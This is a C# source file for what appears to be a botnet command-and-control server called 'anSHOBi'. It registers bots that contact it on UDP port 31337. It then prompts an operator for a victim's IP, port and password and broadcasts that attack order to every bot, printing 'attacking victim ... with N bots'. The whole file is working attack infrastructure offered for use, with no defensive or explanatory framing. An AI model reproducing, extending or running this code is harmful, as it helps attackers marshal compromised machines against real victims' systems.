using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;


namespace anSHOBi
{
    class CnC
    {
        private static List<KeyValuePair<IPAddress, int>> table = new List<KeyValuePair<IPAddress, int>>();
        private static bool isEntered = false;

        static void Main(string[] args)
        {
            try
            {
                Thread th = new Thread(new ThreadStart(collectBots));
                th.Start();
                while (!isEntered) { }
                handleUser();
            }
            catch { }
        }

        private static void handleUser()
        {
            string strIp = "|";
            while (!isNum(strIp))
            {
                Console.Write("\nenter ip: \n");
                strIp = Console.ReadLine();
            }
            string strPort = "|";
            while (!isNum(strPort))
            {
                Console.Write("\nenter port: \n");
                strPort = Console.ReadLine();
            }
            string pass = "|";
            while (pass.Length != 6)
            {
                Console.Write("\nenter password (6 chars): \n");
                pass = Console.ReadLine();
            }
            Console.Write("attacking victim on IP " + strIp + ", port " + strPort + " with " + table.Count + " bots");
            sendToBots(strIp, strPort, pass);
        }

        private static void sendToBots(string strIp, string strPort, string strPass)
        {
            byte[] message = makeMessage(IPAddress.Parse(strIp).GetAddressBytes(),
            BitConverter.GetBytes(Convert.ToUInt16(strPort)), Encoding.ASCII.GetBytes(strPass),
            Encoding.ASCII.GetBytes("anSHOBi"));

            foreach (KeyValuePair<IPAddress, int> tmp in table)
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                IPAddress serverAddr = IPAddress.Parse(tmp.Key.ToString());
                IPEndPoint endPoint = new IPEndPoint(serverAddr, tmp.Value);
                sock.SendTo(message, endPoint);

            }
        }

        private static byte[] makeMessage(byte[] ip, byte[] port, byte[] pass, byte[] name)
        {
            byte[] message = initBytesArr(44);
            ip.CopyTo(message, 0);
            port.CopyTo(message, ip.Length);
            pass.CopyTo(message, ip.Length + port.Length);
            name.CopyTo(message, ip.Length + port.Length + pass.Length);
            return message;
        }

        private static byte[] initBytesArr(int length)
        {
            byte[] arr = new byte[length];
            for (int i = 0; i < arr.Length; ++i)
                arr[i] = Convert.ToByte(' ');
            return arr;
        }

        private static void sendUdp(int srcPort, string dstIp, int dstPort, byte[] data)
        {
            using (UdpClient c = new UdpClient(srcPort))
                c.Send(data, data.Length, dstIp, dstPort);
        }

        private static Boolean isNum(String str)
        {
            for (int i = 0; i < str.Length; ++i)
                if (!isNum(str[i]) && str[i] != '.')
                    return false;
            return true;
        }

        private static Boolean isNum(char c)
        {
            return c >= '0' && c <= '9';
        }


        private static void addToTable(IPAddress ip, int port)
        {
            foreach (KeyValuePair<IPAddress, int> tmp in table)
            {
                if (tmp.Key.Equals(ip) && tmp.Value == port)
                    return;
            }
            table.Add(new KeyValuePair<IPAddress, int>(ip, port));
        }

        private static void collectBots()
        {
            byte[] data = new byte[1024];
            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 31337);
            UdpClient newsock = new UdpClient(ipep);

            Console.WriteLine("Command and control server anSHOBi active");
            isEntered = true;
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);

            data = newsock.Receive(ref sender);

            while (true)
            {
                addToTable(sender.Address, sender.Port);
                data = newsock.Receive(ref sender);
            }

        }
    }
}
